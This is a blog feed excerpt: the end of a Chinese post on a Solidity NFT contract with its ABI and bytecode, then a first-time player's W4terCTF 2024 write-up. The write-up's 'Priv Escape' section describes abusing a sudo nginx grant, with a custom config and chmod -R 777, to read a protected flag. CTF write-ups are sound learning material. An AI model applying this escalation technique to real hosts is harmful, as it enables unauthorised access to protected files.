&#123;</span><br><span class="line">        uint256 token_Id = _urlToTokenId[tokenURI];</span><br><span class="line">        require(_exists(token_Id), &quot;Token with this URL does not exist&quot;);</span><br><span class="line"></span><br><span class="line">        return _owners[token_Id];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取Owener所有的tokenId</span><br><span class="line">    function getOwnedTokenIds(address owner) public view returns (uint256[] memory) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _ownedTokens[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取Owener所有的URL</span><br><span class="line">    function getOwnedURLs(address owner) public view returns (string[] memory) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _ownedURLs[owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 检测地址是否是 合约地址</span><br><span class="line">library Address &#123;</span><br><span class="line">    function isContract(address account) internal view returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下是对一些接口的解释</p>
<ol>
<li>mint</li>
</ol>
<ul>
<li>所需参数: 拥有者地址to，数据URL</li>
<li>实现功能: 铸造一个新的代币，将新代币分配给地址 <code>to</code>，并使用 <code>tokenURI</code> 作为代币的元数据</li>
</ul>
<ol start="2">
<li>burn</li>
</ol>
<ul>
<li>所需参数: 代币tokenId</li>
<li>实现功能: 允许代币的拥有者销毁一个代币。销毁后，代币将从拥有者的余额中移除。</li>
</ul>
<ol start="3">
<li>balanceOf</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回指定地址 <code>owner</code> 拥有的代币数量。</li>
</ul>
<ol start="4">
<li>getOwnedTokenIds</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回一个数组，包含指定地址 <code>owner</code> 拥有的所有代币的 <code>tokenId</code>。</li>
</ul>
<ol start="5">
<li>getOwnedURLs</li>
</ol>
<ul>
<li>所需参数: 地址<code>address owner</code></li>
<li>实现功能: 返回一个数组，包含与指定地址 <code>owner</code> 拥有的代币相关联的所有 <code>tokenURL</code>。</li>
</ul>
<ol start="6">
<li>getTokenIdByUrl</li>
</ol>
<ul>
<li>所需参数: 图片的 <code>tokenURI</code></li>
<li>实现功能: 根据提供的 <code>tokenURI</code> 返回对应的 <code>tokenId</code>。如果不存在具有该 <code>tokenURI</code> 的代币，则抛出错误。</li>
</ul>
<ol start="7">
<li>getURLbyTokenId</li>
</ol>
<ul>
<li>所需参数: 代币的tokenId<code>uint256 tokenId</code></li>
<li>实现功能: 根据提供的 <code>tokenId</code> 返回对应的 <code>tokenURI</code>。如果不存在具有该 <code>tokenId</code> 的代币，则抛出错误。</li>
</ul>
<ol start="8">
<li>OwnerOfTokenId</li>
</ol>
<ul>
<li>所需参数: 代币的tokenId<code>uint tokenId</code></li>
<li>实现功能: 返回拥有指定 <code>tokenId</code> 的代币的地址。如果代币不存在，则抛出错误。</li>
</ul>
<ol start="9">
<li>OwnerOfURL</li>
</ol>
<ul>
<li>所需参数: 图片的 <code>tokenURI</code></li>
<li>实现功能: 根据提供的 <code>tokenURI</code> 返回拥有该 <code>tokenURI</code> 的代币的地址。如果代币不存在，则抛出错误。</li>
</ul>
<h3><span id="abi-和-bytecode">abi 和 bytecode</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var abi = JSON.parse(&#x27;[&#123;\&quot;anonymous\&quot;:false,\&quot;inputs\&quot;:[&#123;\&quot;indexed\&quot;:true,\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;,&#123;\&quot;indexed\&quot;:false,\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;url\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;TokenURLSet\&quot;,\&quot;type\&quot;:\&quot;event\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;balanceOf\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;burn\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;getOwnedTokenIds\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;name\&quot;:\&quot;getOwnedURLs\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string[]\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string[]\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;getTokenIdByUrl\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;getURLbyTokeId\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;to\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;,&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;mint\&quot;,\&quot;outputs\&quot;:[],\&quot;stateMutability\&quot;:\&quot;nonpayable\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;uint256\&quot;,\&quot;name\&quot;:\&quot;tokenId\&quot;,\&quot;type\&quot;:\&quot;uint256\&quot;&#125;],\&quot;name\&quot;:\&quot;ownerOfTokenId\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;owner\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;,&#123;\&quot;inputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;string\&quot;,\&quot;name\&quot;:\&quot;tokenURI\&quot;,\&quot;type\&quot;:\&quot;string\&quot;&#125;],\&quot;name\&quot;:\&quot;ownerOfURL\&quot;,\&quot;outputs\&quot;:[&#123;\&quot;internalType\&quot;:\&quot;address\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;type\&quot;:\&quot;address\&quot;&#125;],\&quot;stateMutability\&quot;:\&quot;view\&quot;,\&quot;type\&quot;:\&quot;function\&quot;&#125;]&#x27;)</span><br><span class="line"></span><br><span class="line">var code = &quot;0x&quot; +  &quot;608060405234801561001057600080fd5b506120a2806100206000396000f3fe608060405234801561001057600080fd5b50600436106100935760003560e01c80634fac7e41116100665780634fac7e41146101445780636dffece41461017457806370a08231146101a4578063cf191354146101d4578063d0def5211461020457610093565b8063105e18a81461009857806312e8ac06146100c85780631741f3e2146100f857806342966c6814610128575b600080fd5b6100b260048036038101906100ad919061114d565b610220565b6040516100bf91906112cc565b60405180910390f35b6100e260048036038101906100dd9190611324565b6103a7565b6040516100ef9190611360565b60405180910390f35b610112600480360381019061010d91906114b0565b610452565b60405161011f9190611508565b60405180910390f35b610142600480360381019061013d9190611324565b6104c7565b005b61015e6004803603810190610159919061114d565b61091a565b60405161016b91906115e1565b60405180910390f35b61018e600480360381019061018991906114b0565b610a20565b60405161019b9190611360565b60405180910390f35b6101be60048036038101906101b9919061114d565b610ac7565b6040516101cb9190611508565b60405180910390f35b6101ee60048036038101906101e99190611324565b610b7e565b6040516101fb919061164d565b60405180910390f35b61021e6004803603810190610219919061166f565b610c6b565b005b6060600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610291576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161028890611717565b60405180910390fd5b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805480602002602001604051908101604052809291908181526020016000905b8282101561039c57838290600052602060002001805461030f90611766565b80601f016020809104026020016040519081016040528092919081815260200182805461033b90611766565b80156103885780601f1061035d57610100808354040283529160200191610388565b820191906000526020600020905b81548152906001019060200180831161036b57829003601f168201915b5050505050815260200190600101906102f0565b505050509050919050565b600080600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361044d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610444906117e3565b60405180910390fd5b919050565b600080600383604051610465919061183f565b908152602001604051809103902054905061047f81610db3565b6104be576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104b5906118c8565b60405180910390fd5b80915050919050565b60006104d2826103a7565b90508073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610542576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161053990611934565b60405180910390fd5b60018060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546105919190611983565b9250508190555060008083815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff021916905560006002600084815260200190815260200160002080546105ed90611766565b80601f016020809104026020016040519081016040528092919081815260200182805461061990611766565b80156106665780601f1061063b57610100808354040283529160200191610666565b820191906000526020600020905b81548152906001019060200180831161064957829003601f168201915b5050505050905060026000848152602001908152602001600020600061068c919061107e565b60038160405161069c919061183f565b9081526020016040518091039020600090556000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b81805490508110156107b25784828281548110610714576107136119b7565b5b90600052602060002001540361079f5781600183805490506107369190611983565b81548110610747576107466119b7565b5b9060005260206000200154828281548110610765576107646119b7565b5b906000526020600020018190555081805480610784576107836119e6565b5b600190038181906000526020600020016000905590556107b2565b80806107aa90611a15565b9150506106f4565b506000600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b81805490508110156109125783604051602001610816919061183f565b6040516020818303038152906040528051906020012082828154811061083f5761083e6119b7565b5b906000526020600020016040516020016108599190611af5565b60405160208183030381529060405280519060200120036108ff5781600183805490506108869190611983565b81548110610897576108966119b7565b5b906000526020600020018282815481106108b4576108b36119b7565b5b9060005260206000200190816108ca9190611cce565b50818054806108dc576108db6119e6565b5b6001900381819060005260206000200160006108f8919061107e565b9055610912565b808061090a90611a15565b9150506107f9565b505050505050565b6060600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361098b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098290611717565b60405180910390fd5b600460008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020805480602002602001604051908101604052809291908181526020018280548015610a1457602002820191906000526020600020905b815481526020019060010190808311610a00575b50505050509050919050565b600080600383604051610a33919061183f565b9081526020016040518091039020549050610a4d81610db3565b610a8c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a83906118c8565b60405180910390fd5b60008082815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915050919050565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610b37576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b2e90611717565b60405180910390fd5b600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6060610b8982610db3565b610bc8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bbf90611e02565b60405180910390fd5b600260008381526020019081526020016000208054610be690611766565b80601f0160208091040260200160405190810160405280929190818152602001828054610c1290611766565b8015610c5f5780601f10610c3457610100808354040283529160200191610c5f565b820191906000526020600020905b815481529060010190602001808311610c4257829003601f168201915b50505050509050919050565b600081604051602001610c7e919061183f565b60405160208183030381529060405280519060200120905060008160001c9050610ca88482610e1e565b610cb28184610fd9565b80600384604051610cc3919061183f565b908152602001604051809103902081905550600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819080600181540180825580915050600190039060005260206000200160009091909190915055600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002083908060018154018082558091505060019003906000526020600020016000909190919091509081610dac9190611e22565b5050505050565b60008073ffffffffffffffffffffffffffffffffffffffff1660008084815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614159050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610e8d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e8490611f40565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610f2e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f2590611fac565b60405180910390fd5b60018060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610f7d9190611fcc565b925050819055508160008083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050565b610fe282610db3565b611021576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110189061204c565b60405180910390fd5b806002600084815260200190815260200160002090816110419190611e22565b50817f9f29759901a481b6bf52ac6c03ccf75f53edec21c990efc5d3828daf7f93f13b82604051611072919061164d565b60405180910390a25050565b50805461108a90611766565b6000825580601f1061109c57506110bb565b601f0160209004906000526020600020908101906110ba91906110be565b5b50565b5b808211156110d75760008160009055506001016110bf565b5090565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061111a826110ef565b9050919050565b61112a8161110f565b811461113557600080fd5b50565b60008135905061114781611121565b92915050565b600060208284031215611163576111626110e5565b5b600061117184828501611138565b91505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b600081519050919050565b600082825260208201905092915050565b60005b838110156111e05780820151818401526020810190506111c5565b60008484015250505050565b6000601f19601f8301169050919050565b6000611208826111a6565b61121281856111b1565b93506112228185602086016111c2565b61122b816111ec565b840191505092915050565b600061124283836111fd565b905092915050565b6000602082019050919050565b60006112628261117a565b61126c8185611185565b93508360208202850161127e85611196565b8060005b858110156112ba578484038952815161129b8582611236565b94506112a68361124a565b925060208a01995050600181019050611282565b50829750879550505050505092915050565b600060208201905081810360008301526112e68184611257565b905092915050565b6000819050919050565b611301816112ee565b811461130c57600080fd5b50565b60008135905061131e816112f8565b92915050565b60006020828403121561133a576113396110e5565b5b60006113488482850161130f565b91505092915050565b61135a8161110f565b82525050565b60006020820190506113756000830184611351565b92915050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6113bd826111ec565b810181811067ffffffffffffffff821117156113dc576113db611385565b5b80604052505050565b60006113ef6110db565b90506113fb82826113b4565b919050565b600067ffffffffffffffff82111561141b5761141a611385565b5b611424826111ec565b9050602081019050919050565b82818337600083830152505050565b600061145361144e84611400565b6113e5565b90508281526020810184848401111561146f5761146e611380565b5b61147a848285611431565b509392505050565b600082601f8301126114975761149661137b565b5b81356114a7848260208601611440565b91505092915050565b6000602082840312156114c6576114c56110e5565b5b600082013567ffffffffffffffff8111156114e4576114e36110ea565b5b6114f084828501611482565b91505092915050565b611502816112ee565b82525050565b600060208201905061151d60008301846114f9565b92915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b611558816112ee565b82525050565b600061156a838361154f565b60208301905092915050565b6000602082019050919050565b600061158e82611523565b611598818561152e565b93506115a38361153f565b8060005b838110156115d45781516115bb888261155e565b97506115c683611576565b9250506001810190506115a7565b5085935050505092915050565b600060208201905081810360008301526115fb8184611583565b905092915050565b600082825260208201905092915050565b600061161f826111a6565b6116298185611603565b93506116398185602086016111c2565b611642816111ec565b840191505092915050565b600060208201905081810360008301526116678184611614565b905092915050565b60008060408385031215611686576116856110e5565b5b600061169485828601611138565b925050602083013567ffffffffffffffff8111156116b5576116b46110ea565b5b6116c185828601611482565b9150509250929050565b7f6f776e6572203d207a65726f2061646472657373000000000000000000000000600082015250565b6000611701601483611603565b915061170c826116cb565b602082019050919050565b60006020820190508181036000830152611730816116f4565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000600282049050600182168061177e57607f821691505b60208210810361179157611790611737565b5b50919050565b7f746f6b656e20646f65736e277420657869737400000000000000000000000000600082015250565b60006117cd601383611603565b91506117d882611797565b602082019050919050565b600060208201905081810360008301526117fc816117c0565b9050919050565b600081905092915050565b6000611819826111a6565b6118238185611803565b93506118338185602086016111c2565b80840191505092915050565b600061184b828461180e565b915081905092915050565b7f546f6b656e207769746820746869732055524c20646f6573206e6f742065786960008201527f7374000000000000000000000000000000000000000000000000000000000000602082015250565b60006118b2602283611603565b91506118bd82611856565b604082019050919050565b600060208201905081810360008301526118e1816118a5565b9050919050565b7f6e6f74206f776e6572206f6620746f6b656e0000000000000000000000000000600082015250565b600061191e601283611603565b9150611929826118e8565b602082019050919050565b6000602082019050818103600083015261194d81611911565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061198e826112ee565b9150611999836112ee565b92508282039050818111156119b1576119b0611954565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603160045260246000fd5b6000611a20826112ee565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203611a5257611a51611954565b5b600182019050919050565b60008190508160005260206000209050919050565b60008154611a7f81611766565b611a898186611803565b94506001821660008114611aa45760018114611ab957611aec565b60ff1983168652811515820286019350611aec565b611ac285611a5d565b60005b83811015611ae457815481890152600182019150602081019050611ac5565b838801955050505b50505092915050565b6000611b018284611a72565b915081905092915050565b600081549050611b1b81611766565b9050919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b600060088302611b847fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82611b47565b611b8e8683611b47565b95508019841693508086168417925050509392505050565b6000819050919050565b6000611bcb611bc6611bc1846112ee565b611ba6565b6112ee565b9050919050565b6000819050919050565b611be583611bb0565b611bf9611bf182611bd2565b848454611b54565b825550505050565b600090565b611c0e611c01565b611c19818484611bdc565b505050565b5b81811015611c3d57611c32600082611c06565b600181019050611c1f565b5050565b601f821115611c8257611c5381611a5d565b611c5c84611b37565b81016020851015611c6b578190505b611c7f611c7785611b37565b830182611c1e565b50505b505050565b600082821c905092915050565b6000611ca560001984600802611c87565b1980831691505092915050565b6000611cbe8383611c94565b9150826002028217905092915050565b818103611cdc575050611db4565b611ce582611b0c565b67ffffffffffffffff811115611cfe57611cfd611385565b5b611d088254611766565b611d13828285611c41565b6000601f831160018114611d425760008415611d30578287015490505b611d3a8582611cb2565b865550611dad565b601f198416611d5087611b22565b9650611d5b86611a5d565b60005b82811015611d8357848901548255600182019150600185019450602081019050611d5e565b86831015611da05784890154611d9c601f891682611c94565b8355505b6001600288020188555050505b5050505050505b565b7f55524c20717565727920666f72206e6f6e6578697374656e7420746f6b656e00600082015250565b6000611dec601f83611603565b9150611df782611db6565b602082019050919050565b60006020820190508181036000830152611e1b81611ddf565b9050919050565b611e2b826111a6565b67ffffffffffffffff811115611e4457611e43611385565b5b611e4e8254611766565b611e59828285611c41565b600060209050601f831160018114611e8c5760008415611e7a578287015190505b611e848582611cb2565b865550611eec565b601f198416611e9a86611a5d565b60005b82811015611ec257848901518255600182019150602085019450602081019050611e9d565b86831015611edf5784890151611edb601f891682611c94565b8355505b6001600288020188555050505b505050505050565b7f6d696e7420746f207a65726f2061646472657373000000000000000000000000600082015250565b6000611f2a601483611603565b9150611f3582611ef4565b602082019050919050565b60006020820190508181036000830152611f5981611f1d565b9050919050565b7f746f6b656e20616c7265616479206d696e746564000000000000000000000000600082015250565b6000611f96601483611603565b9150611fa182611f60565b602082019050919050565b60006020820190508181036000830152611fc581611f89565b9050919050565b6000611fd7826112ee565b9150611fe2836112ee565b9250828201905080821115611ffa57611ff9611954565b5b92915050565b7f55524c20736574206f66206e6f6e6578697374656e7420746f6b656e00000000600082015250565b6000612036601c83611603565b915061204182612000565b602082019050919050565b6000602082019050818103600083015261206581612029565b905091905056fea26469706673582212208ce0ff1638a8640dd8cb470ef80586481b1180275bd6ec1b9adbbc2e27703eb564736f6c63430008130033&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>W4terCTF 2024 Writeup</title>
    <url>/2024/04/29/W4terCTF_2024_Writeup/</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>这是我第一次参加 <em>CTF</em> 竞赛，感觉还是很好玩的，也很有收获<br>由于本人是第一次参加CTF比赛，所以一开始不知道得到flag需要截图，所以有些题目没有flag截图，一些流程的图片也没有截到。但是我会尽量将思路讲清楚的</p>
<h2><span id="writeup">Writeup</span></h2><h3><span id="misc">MISC</span></h3><h4><span id="brokenmp4">broken.mp4</span></h4><p>该题使用untrunc软件，以下载附件得到的第一个视频为reference file，以第二个视频为truncate file，生成第二个视频的修复视频，在视频的最后就可以获得flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/broken.png" class>

<h4><span id="sign-in">Sign in</span></h4><p>该题通过在榜单寻找W4terDr0p队伍，即可获得flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Signin.png" class>
<h4><span id="priv-escape">Priv Escape</span></h4><p>通过sudo -l 可以发现，&#x2F;usr&#x2F;sbin&#x2F;nginx对于当前用户，是被r00t赋权执行的，这就是本题的突破口。那么，解题的流程就应该是：通过r00t开启nginx服务，暴露一个端口，当前用户在访问这个端口的时候，可以通过该端口获取flag<br>具体流程：<br>直接开启nginx肯定是不可行的，关注到nginx的启动命令，可以通过-c 指定nginx.conf的路径。所以要先自己写一个nginx.conf，内容如下（只截取重要部分）：</p>
<p>这里要指定pid的路径，a.pid是自己创建的，而且这个pid的值需要先通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx启动nginx，并用ps -ef | grep nginx 获取到（此处为120），再通过echo输入到a.pid</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv1.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv2.png" class>

<p>这些都要指定到可以访问的目录，否则会报错</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv3.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv4.png" class>

<p>所有的include 也要注释掉，不然会报错</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv5.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv6.png" class>

<p>此处暴露18888端口供当前用户访问</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv7.png" class>

<p>tips：所有的文件创建都可以通过touch + echo 的方式写入，如果写错了，就rm后重写</p>
<p>然后就可以通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;home&#x2F;W4terCTFPlayer&#x2F;nginx.conf 开启nginx服务<br>tips：在此之前，要确定&#x2F;home&#x2F;W4terCTFPlayer下的所有文件可读，可以通过 chmod -R 777  &#x2F;home&#x2F;W4terCTFPlayer 实现</p>
<p>最后，就可以通过curl 127.0.0.1:18888 访问到flag啦</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv8.png" class>

<h4><span id="gz-gpt">GZ GPT</span></h4><p>一开始真的是一点头绪没有，只知道flag、CTF输入的时候会有不一样的回答，然后就一直卡在这。<br>然后后面有出现的这些“东西”，我真的有一大段时间认为是乱码！！！因为我用cmd的时候会有乱码出现，然后一直没有管（啊啊啊救命）</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ1.png" class>

<p>实际上认真观察之后可以发现，这里是有两种图案，而且有八个，所以就能联想到是八位二进制<br>那么我们可以验证一下，发现第一第二个二进制转ASCII 后就是W4，就可以确认是正确的解答方法了<br>然后不断发请求，会发现过了一轮有一句话是没有符号的，说明已经到结尾了。这时就可以将这些二进制数输入转换器，得到以下结果</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ2.png" class>

<h4><span id="spam-2024">Spam 2024</span></h4><p>首先拿到一个很长的垃圾邮件，很容易想到是Spam Encode生成的，Decode 后得到如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">59,6f,75,20,6c,69,6b,65,20,65,6d,6f,6a,69,73,2c,20,64,6f,6e,27,74,20,79,6f,75,3f,0a,0a,01f643,01f4b5,01f33f,01f3a4,01f6aa,01f30f,01f40e,01f94b,01f6ab,01f606,2705,01f606,01f6b0,01f4c2,01f32a,263a,01f6e9,01f30f,01f4c2,01f579,01f993,01f405,01f375,01f388,01f600,01f504,01f6ab,01f3a4,01f993,2705,01f4ee,01f3a4,01f385,01f34e,01f643,01f309,01f383,01f34d,01f374,01f463,01f6b9,01f923,01f418,01f3f9,263a,01f463,01f4a7,01f463,01f993,01f33f,2328,01f32a,01f30f,01f643,01f375,2753,2602,01f309,01f606,01f3f9,01f375,01f4a7,01f385,01f449,01f30a,01f6b9,01f6aa,01f374,01f60e,01f383,01f32a,01f643,01f441,01f94b,01f451,01f4a7,01f418,01f3a4,01f94b,01f418,01f6e9,01f923,01f309,01f6e9,23e9,01f60d,2753,01f418,01f621,2600,01f60d,01f643,01f601,01f600,01f601,01f6ab,01f4c2,2705,2603,01f6ab,01f60e,01f52a,01f451,01f600,01f579,01f6ab,01f60d,01f32a,01f4c2,01f44c,01f34d,01f44c,01f993,01f590,01f923,01f60e,01f3ce,01f34d,01f3f9,01f34c,01f34d,01f3a4,2600,01f3f9,01f388,01f6b0,01f4a7,2600,2709,01f3f9,01f34d,01f993,01f385,01f374,2602,23e9,01f6aa,01f40d,263a,01f418,01f607,01f621,01f375,01f30f,01f993,01f375,01f6e9,01f4c2,01f44c,01f3f9,01f5d2,01f5d2,0a,0a,42,74,77,2c,20,74,68,65,20,6b,65,79,20,69,73,20,22,4b,45,59,22</span><br></pre></td></tr></table></figure>

<p>可以看到，这里面包含了两种编码，一种是59形式 ，另一种是01f643 形式，第一种很容易看出是十六进制，所以放到 CyberChef 中解码得到如下内容：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Spam1.png" class>

<p>根据提示，第二种形式的编码应该是 emoji 的 Unicode 编码，所以我写了一个小程序对其进行转换</p>
